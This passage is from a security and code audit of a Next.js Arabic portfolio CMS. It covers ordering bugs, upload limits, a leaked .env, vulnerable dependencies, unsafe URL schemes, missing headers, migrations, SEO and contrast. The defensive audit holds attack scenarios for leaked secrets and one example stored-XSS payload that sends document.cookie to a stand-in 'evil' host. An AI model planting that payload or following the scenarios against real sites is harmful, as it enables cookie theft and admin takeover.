- **Evidence:** `<section>` has no `id`, and `navLinks` has no "أعمالي" entry, so visitors can't jump to the most persuasive section. Cards use `href={item.link || "#"}`, which scrolls to the top when a link is empty, but `externalSourceUrl` is required, so this is mostly defensive. External links open in the same tab while social links elsewhere use `target="_blank"`, which is inconsistent.
- **Recommendation:** Add `id="portfolio"` and a nav link. Use `target="_blank" rel="noopener noreferrer"` consistently for external links.
- **Effort:** XS

---

## 6. Backend Audit

### BE-001 — Public site renders all ordered content in reverse
- **Category:** Backend / Correctness · **Severity:** High · **Confidence:** Confirmed
- **Location:** `lib/data-server.ts:37,41,53,64,75,78,100` (all `desc(...displayOrder)`), versus `lib/actions/*.actions.ts` (`asc(...)`, e.g. `services.actions.ts:22`, `pricing.actions.ts:29-30`)
- **Evidence:** The admin lists and the seed data (`scripts/seed.ts:102-105,116-126,144-166,185-203,224-240,260-310,340-347`) treat `displayOrder` 0 as first. The public reader sorts **descending**, so every list (features, stats, services, works, packages, package features, social links) appears reversed. For example, the seeded "most popular" middle package stays in the middle, but feature bullets and social icons are reversed.
- **Impact:** The admin's ordering controls produce the opposite of what they expect. This is a core CMS function.
- **Recommendation:** Change the public reads to `asc()`, then add a secondary tiebreaker (`asc(createdAt)`) so equal orders are stable.
- **Implementation guidance:** Do this together with ARCH-001: one shared query module, used by both admin and public with a `visibleOnly` flag, so the two can't drift again.
- **Effort:** XS (≈15 min + verification) · **Dependencies:** none
- **Verification:** Integration test: seed 3 services with orders 0, 1, 2 and assert the order of `getServices()` (public) equals the admin order.

### BE-002 — Upload limits are inconsistent; videos > 10 MB always fail
- **Category:** Backend / Reliability · **Severity:** High · **Confidence:** Confirmed (10 MB limit); Needs Verification (platform limit)
- **Location:** `next.config.mjs:26-31` (`serverActions.bodySizeLimit: '10mb'`); `lib/actions/media.actions.ts:15-16` (image 5 MB, video 50 MB); `components/admin/shared/media-upload.tsx:13-16,100-102`
- **Evidence:**
  - The client and the action both allow 50 MB videos, and the UI says "الحد الأقصى: 50 MB". Next rejects Server Action bodies over 10 MB before the action runs, so any video between 10 and 50 MB fails.
  - The thrown error message is replaced with a generic one in production builds, so the admin sees an unhelpful toast.
  - If deployed on Vercel (the `generator: "v0.app"` metadata and commit history suggest so), the platform request-body limit for functions is about 4.5 MB. That would also break most image uploads near the 5 MB limit and nearly all videos. *Verify the hosting platform.*
- **Impact:** The admin cannot upload most portfolio videos, which is the core content of the site.
- **Recommendation:** Switch to **direct browser → Cloudinary signed uploads**:
  1. Add a Server Action that checks `auth()` and returns a short-lived signature from `cloudinary.utils.api_sign_request` (folder, timestamp, allowed formats, `max_file_size`).
  2. The browser uploads straight to Cloudinary with real `XMLHttpRequest` progress events.
  3. Save the returned `secure_url` (and `public_id`; see BE-007).
  4. Remove the 10 MB Server Action limit afterwards.
- **Effort:** M (≈0.5–1 day) · **Dependencies:** SEC-001 (rotate the Cloudinary secret first)
- **Verification:** Upload a 30 MB MP4 on the deployed environment. It should succeed with real progress, and an unauthenticated signature request should be rejected.

### BE-003 — Multi-step writes without transactions; singleton race
- **Category:** Backend / Data integrity · **Severity:** Medium · **Confidence:** Strongly Suspected
- **Location:** `lib/actions/pricing.actions.ts:51-54,73-76,94-95`; the singleton upserts in `hero.actions.ts:59-74`, `about.actions.ts:49-54`, `settings.actions.ts:56-71,106-121`
- **Evidence:**
  - "Set popular" is two separate statements: unset all, then set one. If the second fails (validation, network, invalid UUID), no package is popular any more.
  - The singleton upserts use `findFirst()` then `insert`. Two concurrent first saves would both try to insert. The `singleton_*` unique index (if applied, see DB-001) rejects the second with an unhandled error. Without the index, two rows are created and `findFirst()` returns either one non-deterministically.
  - `drizzle-orm/neon-http` does not support interactive transactions, but it does support `db.batch([...])`, which runs atomically in a single HTTP transaction.
- **Impact:** Low likelihood with a single admin, but a real partial-state hazard.
- **Recommendation:** Use `db.batch([unsetPopular, setPopular])`. For singletons, give the row a fixed primary key (or use `ON CONFLICT` on the singleton index) with `insert(...).onConflictDoUpdate(...)`.
- **Effort:** S (≈2 h) · **Dependencies:** DB-001 (indexes must actually exist)
- **Verification:** Integration test against a disposable Neon branch or a local Postgres: run `setPopularPackage` with an invalid id and check the previous popular package is preserved; run two concurrent singleton saves and check there is exactly one row.

### BE-004 — Server Actions don't handle DB errors or validate IDs; client gives no feedback
- **Category:** Backend / Error handling · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** All mutation actions in `lib/actions/*.ts` (e.g. `services.actions.ts:40,57,66,75`); all id parameters (`id: string`) are passed unvalidated to `eq(table.id, id)`. On the client: `social-manager.tsx:24-31`, `works-manager.tsx:23-30`, `pricing-manager.tsx:23-30,76-81`, `services-manager.tsx:44-57`, `about-manager.tsx:20-27,53-58,95-103` have no `try/catch`.
- **Evidence:**
  - Actions return `{error}` only for validation and auth failures. A DB failure, a unique-index violation (BE-003), or a non-UUID id (Postgres `invalid input syntax for type uuid`) throws instead.
  - In the managers, a thrown action rejects the `handleSubmit` promise: no toast, no loading reset, and an unhandled-rejection console error.
  - `update*`/`delete*` on a non-existent id report success.
  - Messages are a mix of Arabic and English (`hero.actions.ts`, `settings.actions.ts` use English validation messages in an Arabic UI).
- **Impact:** Silent failures in the admin, and misleading "success" messages.
- **Recommendation:**
  - Introduce a small `action()` wrapper that does `requireAdmin()`, parses `id` with `z.string().uuid()`, wraps the DB call in `try/catch` (logging server-side and returning an Arabic generic error), and returns a typed `{ ok: true } | { ok: false, error }`.
  - Use `.returning({ id })` to detect "not found".
  - Translate all messages.
- **Effort:** S (≈3–4 h) · **Dependencies:** ARCH-001
- **Verification:** Unit-test the wrapper: an invalid UUID returns `{ok:false}`, a thrown DB error returns `{ok:false}` and logs. Manual check: kill the network mid-save and an error toast should appear.

### BE-005 — Public data layer silently swallows DB errors; sequential About queries
- **Category:** Backend / Observability · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `lib/data-server.ts:16-105`
- **Evidence:**
  - Every function has `catch { return fallback }` without logging. If Neon is down or the credentials are rotated incorrectly, the public site quietly serves the **hardcoded** `lib/data.ts` content, which may be out of date (old prices, old contact details), and nobody is alerted.
  - `getAboutContent` runs 3 queries sequentially (lines 35-42), even though the page already parallelizes the top-level calls.
- **Impact:** Stale or incorrect prices and contact information shown to clients without anyone noticing, plus extra latency.
- **Recommendation:** Log with context (`console.error("[data] getServices failed", err)`, which ends up in platform logs), and optionally report to an error tracker. Use `Promise.all` inside `getAboutContent`. Decide deliberately whether a stale fallback is better than an error page for prices, or show a fallback without prices.
- **Effort:** XS (≈30 min) · **Dependencies:** none
- **Verification:** Run locally with an invalid `DATABASE_URL`. The logs should show errors and the page should still render.

### BE-006 — Video upload retries on any error; whole file buffered in memory
- **Category:** Backend · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `lib/actions/media.actions.ts:89-162`, `36-37`, `86-87`
- **Evidence:** Any failure of the `resource_type: "auto"` upload (including auth, format or size errors) triggers a second full upload with `resource_type: "video"`, doubling the time before a deterministic error is shown. Files are fully buffered (`arrayBuffer()` → `Buffer`) in function memory. The MIME check relies on the client-declared `file.type`. Cloudinary's `allowed_formats` is the real guard, which is acceptable.
- **Recommendation:** Becomes moot after BE-002 (direct uploads). If server uploads are kept, use `resource_type: "video"` directly and drop the retry.
- **Effort:** XS

### BE-007 — Cloudinary assets are never deleted; duplicate config
- **Category:** Backend / Cost · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `lib/actions/media.actions.ts:165-186` (unused `deleteMedia`), `lib/cloudinary.ts` (unused duplicate config); the schema stores only URLs (`schema.ts:30,93,130`)
- **Evidence:** Replacing a hero image, icon or video, or deleting a work, leaves the old asset in Cloudinary. Only the URL is stored, not the `public_id`, so later cleanup needs URL parsing. `uploader.destroy(publicId)` without `resource_type: "video"` would not delete videos anyway.
- **Impact:** Slow storage and bandwidth quota growth on the Cloudinary plan.
- **Recommendation:** Store `public_id` and `resource_type` next to URLs (nullable columns). Delete the old asset after a successful replacement or delete, and treat cleanup failures as non-blocking. Keep one Cloudinary config module.
- **Effort:** S · **Dependencies:** BE-002, DB migration

### BE-008 — Dashboard counts load whole tables sequentially
- **Category:** Backend / Performance · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `app/admin/page.tsx:32-35`
- **Evidence:** Four sequential `findMany()` calls fetch every row only to read `.length`. The tables are tiny today, so the impact is small.
- **Recommendation:** Use `db.$count(table)` (Drizzle ≥ 0.36) or `select({ c: count() })` inside `Promise.all`. Also replace the raw `<a>` quick links (line 160) with `next/link`.
- **Effort:** XS

### ARCH-001 — Duplicated read paths and auth boilerplate; middleware double `auth()`
- **Category:** Architecture · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `lib/data-server.ts` vs the `get*` functions in `lib/actions/*.ts`; the 42 copies of `const session = await auth(); if (!session?.user?.id) …`; `middleware.ts:5-18,46-54`; `auth.ts:3-6`
- **Evidence:**
  - Public and admin reads are implemented twice, with different ordering. That duplication is the root cause of BE-001.
  - The read helpers live in `"use server"` files, which makes them callable as Server Actions. That's fine, because they check auth, but they are better as plain server-only functions.
  - `middleware.ts` calls `auth()` twice for the same request on authenticated paths, and keeps an unused `rateLimit` Map (lines 5-6). Its comment claims in-memory limiting is "adequate", but in-memory state is not shared across serverless instances.
  - Because `auth.ts` imports `db` and `bcryptjs`, they are bundled into middleware, even though middleware only needs JWT verification.
- **Recommendation:**
  - Create `lib/queries/*` (server-only) with `listServices({ visibleOnly })` etc., and `lib/auth/require-admin.ts`.
  - Simplify middleware to a single check.
  - Optionally split into an `auth.config.ts` (edge-safe, no DB) and an `auth.ts` (Credentials), as the Auth.js v5 docs recommend.
- **Effort:** S (≈3–4 h) · **Dependencies:** best done with BE-001 and BE-004

---

## 7. Security Audit

### 7.1 Verified vulnerabilities

#### SEC-001 — Production `.env` with all secrets committed to a public repository
- **Category:** Security · **Severity:** Critical · **Confidence:** Confirmed (exposure). The live validity of the values was not checked; **assume they are valid.**
- **Location:** `/.env` (tracked); `.gitignore:11` only ignores `.env*.local`. History: `.env` appears in commits `4927d6d`, `ec2060b`, `abb42de`, `33d7537`, `ff4d683`, `bf7c212`, `de6ba39`. The repository `Rashadhusien/portfolio-ar` is **public** (`private: false`).
- **Variables exposed (names only):**
  - `DATABASE_URL`
  - `AUTH_SECRET`
  - `ADMIN_EMAIL`, `ADMIN_PASSWORD`
  - `CLOUDINARY_CLOUD_NAME`, `CLOUDINARY_API_KEY`, `CLOUDINARY_API_SECRET`
  - `AUTH_URL`, `NEXT_PUBLIC_BASE_URL`
  - `NEXT_PUBLIC_EMAILJS_*` (public by design)
  - History only: `STRIPE_SECRET_KEY`, `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` (commits `abb42de`, `33d7537`), and Sanity variables including `SANITY_API_TOKEN` (commit `4927d6d`)
- **Attack scenarios:**
  1. **`DATABASE_URL`:** anyone can connect directly to Neon and read, alter or drop every table, or rewrite the `admins.password` hash to take over the admin. This bypasses all application authorization.
  2. **`AUTH_SECRET`:** an attacker can forge a valid Auth.js JWT session cookie for any user id, which passes `middleware.ts` and every `auth()` check in the Server Actions. That is full admin access without a password.
  3. **`ADMIN_PASSWORD`:** if the seeded password was never changed, it is a direct login.
  4. **`CLOUDINARY_API_SECRET`:** an attacker can upload or delete any asset, exhaust the quota, or host arbitrary content on the account.
  5. **`STRIPE_SECRET_KEY` (historical):** if it was a live key and is still valid, it allows charges, refunds and customer data access.
- **Impact:** Complete compromise of content, data and media, plus possible financial exposure. Public GitHub repositories are scanned continuously by credential-harvesting bots, so treat this as already exploited.
- **Recommendation (in order):**
  1. **Rotate now:** reset the Neon role password (or create a new role and revoke the old one), generate a new `AUTH_SECRET` (this invalidates all sessions), change the admin password, regenerate the Cloudinary API key/secret, and roll or delete any Stripe and Sanity keys that existed.
  2. Set the new values only in the hosting platform's environment settings.
  3. `git rm --cached .env`, add `.env` and `.env*` (with a `!.env.example` exception) to `.gitignore`, and commit a `.env.example` with placeholder values.
  4. Purge `.env` from history (`git filter-repo --path .env --invert-paths`), force-push, and ask GitHub Support to clear cached views if needed. **Rotation is mandatory regardless.** History rewriting does not un-leak anything.
  5. Review Neon, Cloudinary and Stripe access logs for unknown activity, and inspect `admins` and the content tables for unexpected changes.
  6. Enable GitHub secret scanning and push protection.
- **Effort:** M (≈2–4 h hands-on, plus coordination) · **Dependencies:** none. **Do this first.**
- **Verification:** `git ls-files | grep -x .env` is empty; `git log --all -- .env` is empty after the purge; the old DB URL and Cloudinary key are rejected by their services; existing admin sessions are invalidated.

#### SEC-002 — `next` and `next-auth` versions with critical published advisories
- **Category:** Security · **Severity:** Critical · **Confidence:** Confirmed (advisory match by version, via `npm audit --package-lock-only`)
- **Location:** `package.json` → resolved `next@15.5.23`, `next-auth@5.0.0-beta.30` / `@auth/core@0.41.0`, `drizzle-orm@0.45.1`
- **Evidence (advisory titles from npm audit):**
  - **next < 15.5.24:** "Unauthenticated Remote Code Execution in Image Optimization API when AVIF files are used" (critical). The site uses `next/image` with remote Cloudinary patterns, so `/_next/image` is exposed. *Also:* RCE on Windows-hosted servers (not applicable if hosted on Linux/Vercel), and cache-poisoning advisories for SSG/ISR (< 15.5.27).
  - **next-auth ≤ 5.0.0-beta.31:** "Configuration errors can cause existence-based auth checks to fail open (auth object populated with an error)" (critical). `middleware.ts:15,51` uses exactly this pattern (`if (session)` / `if (!session)`). The Server Actions check `session?.user?.id`, which is more robust, but the middleware gate and `app/admin/page.tsx:27` are existence-based. Also: an email-normalizer homoglyph bypass (critical; mainly affects the Email provider, which isn't used here) and `getToken()` crashing on malformed Bearer headers (high).
  - **drizzle-orm < 0.45.2:** "SQL injection via improperly escaped SQL identifiers" (high). Exploitability here is **low**, because the app never builds identifiers from user input, but upgrade anyway.
  - The remaining advisories are mostly in dev and build tooling (see §11).
- **Impact:** Possible unauthenticated server compromise via the image optimizer, and possible auth bypass under configuration errors.
- **Recommendation:**
  - Upgrade `next` to the latest 15.5.x (≥ 15.5.27). A Next 16 migration is optional and separate (it would include renaming middleware to proxy).
  - Upgrade `next-auth` to a fixed release (> beta.31, or the stable v5 line if available).
  - Upgrade `drizzle-orm` to ≥ 0.45.2.
  - In middleware, check `session?.user?.id` rather than just `session`.
- **Effort:** S (≈1–3 h including a smoke test) · **Dependencies:** DEVOPS-001 is recommended so the upgrade is verified by build and tests.
- **Verification:** `npm audit --omit=dev` shows no critical or high findings for runtime packages. Login, logout, an admin CRUD action and image rendering all still work.

#### SEC-003 — No brute-force protection on admin login
- **Category:** Security · **Severity:** High · **Confidence:** Confirmed
- **Location:** `middleware.ts:20-43` (rate limiter commented out; it also targeted the login *page* route, not the credentials POST); `auth.ts:15-39`; `app/(auth)/admin/login/page.tsx:25,103-113` (a "blocked" banner exists but nothing triggers it)
- **Evidence:** `/api/auth/callback/credentials` can be called without limit. bcrypt cost 10 slows each guess slightly but doesn't stop online guessing. There is no lockout, no delay, no CAPTCHA, and no 2FA. This is the single account that controls all public content.
- **Attack scenario:** Credential stuffing or a dictionary attack against the known admin email. That email may also be visible in the leaked `.env` (SEC-001) or guessable from the public contact email.
- **Impact:** Admin takeover, then defacement or redirecting visitors' contact links (see SEC-004).
- **Recommendation:** Rate-limit by IP **and** by email in `authorize()`, using a shared store: Upstash Redis or Vercel KV, or a small `login_attempts` table in the existing Neon DB to avoid a new dependency. For example, allow 5 failures per 15 minutes, then lock. Return the same generic error. Also consider TOTP 2FA for the single admin.
- **Effort:** S (≈2–4 h) · **Dependencies:** SEC-001
- **Verification:** A scripted test of 6 bad attempts should make the 6th rejected even with correct credentials until the window expires. Check that the lock is per email and survives across serverless instances.

#### SEC-004 — URL fields accept `javascript:` and other unsafe schemes (stored XSS vector)
- **Category:** Security · **Severity:** Medium · **Confidence:** Confirmed (code path); exploitation requires admin write access
- **Location:**
  - `lib/actions/social.actions.ts:12` (`z.string().url()`)
  - `hero.actions.ts:16,19` (`ctaButtonLink*`: `min(1)`)
  - `works.actions.ts:12,14` (`videoUrl`, `externalSourceUrl`: `min(1)`)
  - `social.actions.ts:13` (`iconUrl`)
  - `settings.actions.ts:15-16`
  - Rendered as `href` in `hero.tsx:49,68`, `contact.tsx:177`, `footer.tsx:75`, `portfolio.tsx:36`
- **Evidence:** Zod's `.url()` accepts any scheme that `new URL()` parses, including `javascript:alert(1)`. The other fields accept any string. React 18.3 only **warns** about `javascript:` URLs in `href`; it does not block them (React 19 blocks them).
- **Attack scenario:** Someone with admin access saves `javascript:fetch('https://evil/?c='+document.cookie)` as a social link. Admin access is plausible given SEC-001 and SEC-003, or a direct DB write via the leaked `DATABASE_URL`. Every visitor who clicks it runs attacker script on the site's origin. The more likely abuse is silently redirecting the WhatsApp, email or social links to an impostor.
- **Impact:** Script execution and phishing on the public site.
- **Recommendation:** Add a shared `safeUrl` Zod refinement: `https:` only (plus `mailto:` and `tel:` where appropriate) or same-site relative paths starting with `/` or `#`. Apply it to every URL column. Optionally add a render-time guard in the components. Upgrading to React 19 adds a second layer of protection.
- **Effort:** S (≈1–2 h) · **Dependencies:** FE-005 (same helper)
- **Verification:** Unit tests: `safeUrl` rejects `javascript:`, `data:` and `vbscript:`, and accepts `https://…`, `/videos/x.mp4` and `#contact`.

#### SEC-005 — Missing security headers
- **Category:** Security · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `next.config.mjs:32-52`
- **Evidence:**
  - Present: `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, and `X-XSS-Protection: 1; mode=block` (deprecated; modern guidance is to omit it or set `0`).
  - Missing: `Content-Security-Policy`, `Referrer-Policy`, `Permissions-Policy`, and `Strict-Transport-Security` (Vercel adds HSTS on its domains; verify for custom domains).
- **Impact:** No defence-in-depth against SEC-004-style injections, and full referrer URLs leak to third parties.
- **Recommendation:**
  - Add a CSP that allows `self`, `res.cloudinary.com` (img/media), `api.emailjs.com` (connect) and Google Fonts (handled by `next/font` self-hosting, so likely not needed), with `frame-ancestors 'none'`.
  - Start in `Content-Security-Policy-Report-Only`. Note that Next.js inline scripts require nonces or `'unsafe-inline'`; see the Next.js CSP guide for 15.x with middleware nonces.
  - Add `Referrer-Policy: strict-origin-when-cross-origin` and a minimal `Permissions-Policy`.
- **Effort:** S (≈2–3 h including report-only tuning) · **Verification:** securityheaders.com / Mozilla Observatory scan; no CSP violations in the console during normal use.

#### SEC-006 — Sessions not invalidated on password change; 30-day JWT lifetime
- **Category:** Security · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `lib/actions/auth.actions.ts:23-70`; `auth.ts:42-56` (no `session.maxAge`, so the default 30 days applies)
- **Evidence:** Sessions are stateless JWTs. Changing the password updates the hash but every existing token stays valid until it expires. If an attacker has a session, the owner's password change doesn't evict them.
- **Recommendation:** Add a `sessionVersion` (or `passwordChangedAt`) column to `admins`, embed it in the JWT on sign-in, and check it in the `jwt` callback (one cheap query per request; acceptable for admin-only traffic), or check it only in the `requireAdmin()` helper. Shorten `maxAge` to something like 8–24 hours. Rotating `AUTH_SECRET` as part of SEC-001 resets all sessions once.
- **Effort:** S (≈2–3 h) · **Dependencies:** DB migration; ARCH-001
- **Verification:** Log in on two browsers and change the password in one. The other is rejected on its next admin request.

### 7.2 Potential risks

#### SEC-007 — Contact form abuse (client-side EmailJS, no CAPTCHA/honeypot)
- **Category:** Security / Abuse · **Severity:** Low · **Confidence:** Needs Verification
- **Location:** `components/contact.tsx:30-55,123-165`
- **Evidence:** The EmailJS public key and template are public by design. Anyone can script `emailjs.send` with arbitrary content, limited only by EmailJS-side protections. There is no honeypot, CAPTCHA, or length limit (`maxLength`). Whether "allowed origins" or rate limits are configured in the EmailJS dashboard could not be checked.
- **Impact:** Spam, exhausting the monthly EmailJS quota (so real leads are lost), or abuse of the template if it reflects user input to third parties.
- **Recommendation:**
  - In the EmailJS dashboard, restrict allowed origins, enable its built-in reCAPTCHA or limits, and make sure the template sends only to the owner.
  - In code, add a hidden honeypot field and `maxLength` attributes.
  - Optionally move sending to a Server Action with server-side rate limiting.
- **Effort:** S

#### SEC-008 — Weak defaults: seed fallback `admin123`, 8-character policy, case-sensitive email
- **Category:** Security · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `scripts/seed.ts:28-29`; `lib/actions/auth.actions.ts:15`; `auth.ts:20-22`
- **Evidence:**
  - If `ADMIN_PASSWORD` is unset, the seed creates `admin@example.com` / `admin123`.
  - Password changes only require 8 characters.
  - Login looks up the exact email string, so `Admin@x.com` fails. That's a usability issue, not a security hole.
- **Recommendation:** Make the seed fail if `ADMIN_EMAIL` or `ADMIN_PASSWORD` is missing in non-development environments. Require 12 or more characters (or a zxcvbn-style check). Normalize email (`trim().toLowerCase()`) on seed and login.
- **Effort:** XS

### 7.3 Security hardening and positive controls

- ✅ Every mutating Server Action checks `auth()` server-side, so a protected UI isn't the only line of defence.
- ✅ All inputs pass through Zod on the server. There is no raw SQL built from user input; Drizzle parameterizes queries. `scripts/apply-constraints.ts` uses only static SQL.
- ✅ Auth.js handles CSRF for credentials sign-in. Server Actions are POST-only with Next's built-in Origin check.
- ✅ There is no `dangerouslySetInnerHTML` in app code (the only occurrence is generated `components/ui/chart.tsx`, which is unused).
- ✅ The login error message is generic (no account enumeration), and passwords are hashed with bcrypt.
- ✅ `X-Frame-Options: DENY` prevents clickjacking of the admin.
- ✅ Server-only secrets are not prefixed `NEXT_PUBLIC_`.
- ➕ Hardening: avoid surfacing raw Cloudinary error text to clients (`media.actions.ts:57,115,153`). It is harmless today but leaks provider details.

---

## 8. Database and Data Integrity

**Technology:** Neon Postgres over HTTP (`drizzle-orm/neon-http`), 12 tables. 11 are content tables plus `admins`. 4 of them are logical singletons.

**Strengths:** UUID primary keys with DB defaults; `NOT NULL` used consistently; `pricing_features.package_id` FK with `ON DELETE CASCADE`; `admins.email` is unique; a partial unique index enforces a single popular package (`drizzle/0002_add_constraints.sql:2`); singleton unique indexes on `((1))`; reasonable indexes on `display_order` and visibility. Connection management suits serverless: the HTTP driver needs no pooling.

### DB-001 — Migration history inconsistent with the real DB; `push` may drop constraints
- **Category:** Database / DevOps · **Severity:** Medium · **Confidence:** Strongly Suspected
- **Location:** `drizzle/meta/_journal.json` (only `0000`, `0001`); `drizzle/0002_add_constraints.sql`, `drizzle/0003_apply_constraints.sql` (not journaled, so `drizzle-kit migrate` ignores them); `scripts/apply-constraints.ts`; `lib/schema.ts` (declares none of these indexes); `package.json` scripts `db:push`, `db:migrate`, `db:constraints`
- **Evidence:**
  - The constraints and indexes exist only through a manual script, outside migration tracking.
  - Because `schema.ts` doesn't declare them, `drizzle-kit push` (or `generate`) treats them as drift and proposes dropping them. That would remove the singleton and "one popular" guarantees BE-003 depends on.
  - `0002` and `0003` duplicate each other.
  - Whether the indexes actually exist in production can't be confirmed without DB access.
- **Impact:** Silent loss of integrity constraints. An environment rebuilt from migrations alone would be missing them.
- **Recommendation:**
  - Declare the indexes in `schema.ts`: `pgTable(..., (t) => [uniqueIndex("unique_popular_package").on(t.isPopular).where(sql\`${t.isPopular} = true\`), index(...)...])`. Singleton expression indexes can use `uniqueIndex(...).using("btree", sql\`(1)\`)`, or switch to a fixed-PK singleton pattern.
  - Generate a proper journaled migration.
  - Delete the ad-hoc `0002`/`0003` files and the script.
  - Standardize on `generate` + `migrate` (not `push`) for production.
- **Effort:** S (≈2–3 h, test on a Neon branch) · **Dependencies:** SEC-001 (rotated DB credentials)
- **Verification:** On a fresh Neon branch, `npm run db:migrate` creates all indexes (`\di` in psql), and `drizzle-kit generate` afterwards reports "No schema changes".

### DB-002 — Unused enum, timestamps without timezone, unbounded text
- **Category:** Database · **Severity:** Low · **Confidence:** Confirmed
- **Location:** `lib/schema.ts:13,24-25` (all tables)
- **Evidence:**
  - The `popular_package` enum exists in the DB but is unused.
  - `timestamp` has no `withTimezone`. That's fine for display-free audit fields, but `timestamptz` is the safer default.
  - `updatedAt` is maintained manually (and `pricing.actions.ts:52,94` sets `isPopular` without updating `updatedAt`); Drizzle's `$onUpdate(() => new Date())` would centralize this.
  - Text fields have no length limits in either Zod or the DB, so a 10 MB "feature" string would be accepted (admin-only).
- **Recommendation:** Drop the enum in the DB-001 migration, add `.max()` limits in Zod (e.g. titles 120, descriptions 2000, URLs 2048), and optionally switch to `timestamptz` / `$onUpdate`.
- **Effort:** S

**Backups:** Neon offers point-in-time restore depending on plan. Confirm the retention window, especially given the possible compromise in SEC-001. Before rotating credentials, consider creating a Neon branch as a snapshot for forensic comparison.

---

## 9. SEO and Accessibility

### SEO-001 — Static metadata ignores DB settings; no `metadataBase`, canonical, or OG image
- **Category:** SEO · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `app/layout.tsx:24-35,48-51`
- **Evidence:**
  - Title and description are hardcoded, so `site_settings.metaTitle`, `metaDescription` and `ogLocale` have no effect.
  - There is no `metadataBase`, so OG URLs are relative, and no `alternates.canonical`, `openGraph.url`, `openGraph.images`, or `twitter` card.
  - `generator: "v0.app"` advertises tooling without benefit.
  - The `<head>` duplicates the favicon links that `app/favicon.ico` already provides through the file convention.
- **Impact:** Weak social previews (no image when shared on WhatsApp, X or Facebook, which matters for a media kit) and CMS settings with no effect.
- **Recommendation:**
  - Implement `export async function generateMetadata()` in `app/page.tsx` (or the layout) that reads `getSiteSettings()`.
  - Set `metadataBase: new URL(process.env.NEXT_PUBLIC_BASE_URL)` and `alternates: { canonical: "/" }`.
  - Add an `opengraph-image` (static `app/opengraph-image.jpg`, or generated with `next/og`).
  - Remove `generator` and the manual `<link rel="icon">`.
  - Wrap the settings read in React `cache()` so metadata and the page share one query.
- **Effort:** S (≈2 h) · **Dependencies:** FE-004, PERF-001
- **Verification:** View the page source and use the opengraph.xyz or Facebook Sharing Debugger preview. Changing the admin meta title changes `<title>`.

### SEO-002 — No `sitemap`/`robots`; admin pages not marked `noindex`
- **Category:** SEO · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `app/` (no `sitemap.ts`, `robots.ts`); `app/(auth)/admin/login/page.tsx` is publicly reachable
- **Recommendation:** Add `app/robots.ts` (allow `/`, disallow `/admin`, `/api`, and point to the sitemap) and `app/sitemap.ts` (one URL). Add `export const metadata = { robots: { index: false } }` to the admin and login layouts (login is a client page, so add a small server layout in `(auth)`).
- **Effort:** XS · **Verification:** `/robots.txt` and `/sitemap.xml` respond; the login page has `<meta name="robots" content="noindex">`.

### SEO-003 — No structured data (Informational)
- **Recommendation:** Add a JSON-LD `Person` (name, sameAs → social URLs, jobTitle) or `ProfilePage` block generated from DB data in `app/page.tsx`. **Effort:** XS.

Other SEO observations (no finding needed): the heading hierarchy is sensible (one `h1` in Hero, `h2` per section, `h3` for cards); content is server-rendered, so it is crawlable even though sections are client components; `lang="ar"` / `dir="rtl"` are correct.

### A11Y-001 — Colour-contrast failures
- **Category:** Accessibility · **Severity:** Medium · **Confidence:** Confirmed (computed from CSS tokens with the WCAG 2.x formula)
- **Location:** `app/globals.css:18-52`; usages such as `about.tsx:65,88` (`text-accent` stats numbers), `portfolio.tsx:73` (link), `admin/about/about-manager.tsx:124`, `contact.tsx:161` (`text-green-500`), and primary buttons everywhere
- **Evidence (light theme, the only active theme):**

  | Pair | Ratio | WCAG AA (normal text 4.5:1 / large 3:1) |
  |------|------:|-----------------------------------------|
  | `--accent` text on `--background` | **1.75:1** | Fails both |
  | `--accent` text on `--card` | **1.68:1** | Fails both |
  | `--primary-foreground` on `--primary` (default buttons) | **3.33:1** | Fails normal; passes large only |
  | White on `--primary` (contact submit `text-white`) | **3.46:1** | Fails normal |
  | `text-green-500` success message on background | **2.19:1** | Fails |
  | `--muted-foreground` on `--background` | **4.45:1** | Marginal fail |
  | `--accent-foreground` on `--accent` (badge) | 5.60:1 | Passes |

- **Impact:** The key numbers (follower counts), CTAs and the success message are hard to read for low-vision users and in sunlight on mobile.
- **Recommendation:** Darken `--primary` (e.g. lightness 45% → ~35%) and `--muted-foreground` (45% → ~40%). Stop using `--accent` as a text colour on light backgrounds: keep it for fills and borders, and use `--primary` or a darker `--accent-strong` token for text. Use `text-green-700` or the theme's success token.
- **Effort:** S · **Verification:** Re-run the contrast computation or axe DevTools; all text pairs at ≥ 4.5:1.

### A11Y-002 — Nested interactive elements (`<a><button>`)
- **Category:** Accessibility · **Severity:** Medium · **Confidence:** Confirmed
- **Location:** `components/hero.tsx:49-57`, `pricing.tsx:68-75`, `contact.tsx:83-88,102-111`
- **Evidence:** `<Link><Button/></Link>` and `<a><Button/></a>` produce a `<button>` inside an `<a>`. That is invalid HTML (interactive content inside interactive content), creates two tab stops per CTA, and screen readers announce it inconsistently.
- **Recommendation:** Use the shadcn pattern `<Button asChild><Link href=…>…</Link></Button>`.
- **Effort:** XS · **Verification:** Validate the HTML with W3C or axe ("nested-interactive" rule). There should be one tab stop per CTA.

### A11Y-003 — Missing labels and accessible names
- **Category:** Accessibility · **Severity:** Medium · **Confidence:** Confirmed
- **Location:**
  - `components/contact.tsx:128-150`: the inputs have placeholders only, no `<label>` or `aria-label`.
  - Icon-only buttons with no accessible name: `components/admin/*/…-manager.tsx` (edit and delete), e.g. `social-manager.tsx:59-60`, `pricing-manager.tsx:56-58,102-103`.
  - `<Label>` without `htmlFor` and inputs without `id` across the admin manager dialogs (e.g. `works-manager.tsx:39-49`, `services-manager.tsx:94-126`).
  - The navbar profile button (`navbar.tsx:109-121`) has no `aria-expanded` or `aria-haspopup`.
  - Contact submit success/error messages have no `aria-live` region.
- **Recommendation:** Add visible labels (or `sr-only` labels) to the contact fields; `aria-label="تعديل"` / `"حذف"` on icon buttons; pair `Label htmlFor` with `Input id`; `role="status"` / `aria-live="polite"` for form result messages.
- **Effort:** S · **Verification:** axe DevTools shows zero "label" or "button-name" violations; a screen-reader pass with NVDA or VoiceOver in Arabic.

